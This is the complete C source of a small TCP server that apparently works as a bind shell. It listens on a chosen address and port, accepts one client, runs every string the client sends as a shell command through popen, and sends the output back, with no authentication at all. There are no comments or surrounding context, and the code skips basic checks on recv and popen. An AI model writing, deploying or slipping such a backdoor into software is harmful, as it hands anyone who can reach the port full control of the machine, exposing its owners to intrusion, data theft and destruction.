#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE 1024

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <server_ip> <server_port>\n", argv[0]);
        return 1;
    }

    int sockid;
    int server_port = atoi(argv[2]);
    char *server_ip = argv[1];

    sockid = socket(AF_INET, SOCK_STREAM, 0);

    if (sockid == -1) {
        perror("Error while creating socket");
        return 1;
    }

    struct sockaddr_in server_addr, client_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    int bind_result = bind(sockid, (const struct sockaddr *)&server_addr, sizeof(server_addr));

    if (bind_result < 0){
        printf("Error during binding\n");
        return 1;
    }
    else {
        printf("Server listening on %s:%d\n", server_ip, server_port);
        int n = listen(sockid, 1);

        if (n < 0){
            printf("Error during listen()\n");
            return 1;
        }

        socklen_t len = sizeof(client_addr);
        char client_message[BUFFER_SIZE];
        char result_buffer[BUFFER_SIZE];
        char prog_done[] = "PROG:DONE";

        int client_socket = accept(sockid, (struct sockaddr *)&client_addr, &len);
        printf("Accepted connection from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
        if (client_socket < 0){
                printf("Error during accept()\n");
                return 1;
        }
        while (1) {
            bzero(client_message, BUFFER_SIZE);
            bzero(result_buffer, BUFFER_SIZE);
            recv(client_socket, client_message, sizeof(client_message), 0);
            FILE *fp = popen(client_message, "r");
            while (fgets(result_buffer, sizeof(result_buffer), fp) != NULL) {
                send(client_socket, result_buffer, strlen(result_buffer), 0);
                printf("Data sent to %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
            }
            pclose(fp);
            send(client_socket, prog_done, strlen(prog_done), 0);
        }
    }

    close(sockid);
    return 0;
}
